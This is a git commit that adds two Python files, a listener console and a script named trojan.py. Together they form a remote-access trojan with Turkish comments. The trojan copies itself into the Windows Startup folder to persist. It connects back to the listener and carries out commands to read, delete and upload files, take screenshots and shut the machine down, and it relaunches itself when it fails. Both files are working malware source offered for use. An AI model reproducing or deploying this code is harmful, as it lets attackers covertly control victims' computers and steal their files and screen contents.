72cc273834941656a5ef208b6bf9d5ce60a65225
rootalprens <rootalprens@gmail.com>
2025-01-21 20:33:42 +0300

    Add files via upload

---
+++ listener.py
@@ -0,0 +1,41 @@
+import socket
+from colorama import Fore,Back,Style,init
+init()
+
+port=int(input("lütfen bağlanmka istedğiinz port:"))
+baglantı=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+baglantı.bind(("0.0.0.0",port))
+print("sunucu dinleniyor........")
+baglantı.listen(1)
+conn,addr=baglantı.accept()
+print(conn,addr)
+
+while True:
+    emir=input(Fore.RED+"PRENS>"+Fore.RESET)
+
+    if emir.startswith("download"):
+        try:
+            conn.settimeout(3.5)
+
+            downloadfile=emir.split()[1]
+            conn.send(emir.encode("utf-8"))
+            with open(downloadfile,"wb")as file:
+                while True:
+                    data=conn.recv(16384)
+                    if not data:
+                        file.close()
+                        break
+
+                    file.write(data)
+        except socket.timeout:
+            print("dosya indirildi")
+            continue
+        except Exception as e:
+            print(e)
+
+
+    conn.send(emir.encode("utf-8"))
+    response=conn.recv(16384).decode("utf-8")
+    print(response)
+
+
---
+++ trojan.py
@@ -0,0 +1,115 @@
+import socket
+import os
+import time
+import subprocess
+import sys
+import pyautogui
+host="127.0.0.1"
+port=2505
+
+
+
+#kalıcılık----------------------------------------------------
+pyname=os.path.basename(__file__)
+print(pyname)
+exename=pyname.replace(".py",".exe")
+print(exename)
+os.system(f"copy {pyname} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\startup\" ")
+#kalıcılık-----------------------------------------------------
+
+
+def main():
+    try:
+        #baglantı-------------------------------------------
+        while True:
+            try:
+                Baglantı=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                Baglantı.connect((host,port))
+                break
+            except Exception as e:
+                print(e)
+                time.sleep(5)
+        #baglantı------------------------------------------------
+
+        while True:
+            emir=Baglantı.recv(16384).decode("utf-8")
+            dizinimiz=os.getcwd()
+
+            if emir=="kapat":
+                os.system("shutdown -s -t 3")
+                response="kapatılıyor"
+
+#-------------------DOSYA VE DİZİN İŞLEMLERİ-----------------------------
+            elif emir.startswith("cd"):
+                dizinimiz=emir.split()
+                dizinimiz=dizinimiz[1]
+                os.chdir(dizinimiz)
+                response="dizin değiştirildi"
+            
+            elif emir=="pwd":
+                response=dizinimiz
+            
+            elif emir=="cd ..":
+                oncekıdızın=os.path.dirname(dizinimiz)
+                os.chdir(oncekıdızın)
+                response="dizin değiştirildi"
+
+            elif emir.startswith("touch"):
+                touch=emir.split()
+                touch=touch[1]
+                with open(touch,"w")as file:
+                    file.write("")
+                response=f"dosya oluşturuldu {touch}"
+
+            elif emir.startswith("rm"):
+                rm=emir.split()
+                rm=rm[1]
+                os.remove(rm)
+                response="dosya silindi"
+
+            elif emir=="ls":
+                dosyalar=os.listdir()
+                response="\n".join(dosyalar)
+
+            elif emir.startswith("cat"):
+                cat=emir.split()
+                cat=cat[1]
+                with open(cat,"r")as file:
+                    response=file.read()
+#-------------------DOSYA VE DİZİN İŞLEMLERİ-----------------------------
+            elif emir.startswith("download"):
+                downloadfile=emir.split()[1]
+                with open(downloadfile,"rb")as file:
+                    chunk=file.read(16384)
+                    while chunk:
+                        Baglantı.send(chunk)
+                        chunk=file.read(16384)
+                    response=""
+                    
+
+            elif emir.startswith("screenshot"):
+
+                try:
+                   ssname=emir.split()[1]
+                   ssyolu=os.path.join(dizinimiz,ssname)
+                   screenshot=pyautogui.screenshot()
+                   screenshot.save(ssyolu)
+                   response="ss alındı"
+                except Exception as e:
+                    response=e
+
+
+
+            else:
+                response="GEÇERSİZ EMİR"
+             
+            Baglantı.send(response.encode("utf-8"))
+            
+
+
+    except Exception as e:
+        print(e)
+        time.sleep(5)
+        subprocess.run([sys.executable, *sys.argv])
+
+main()
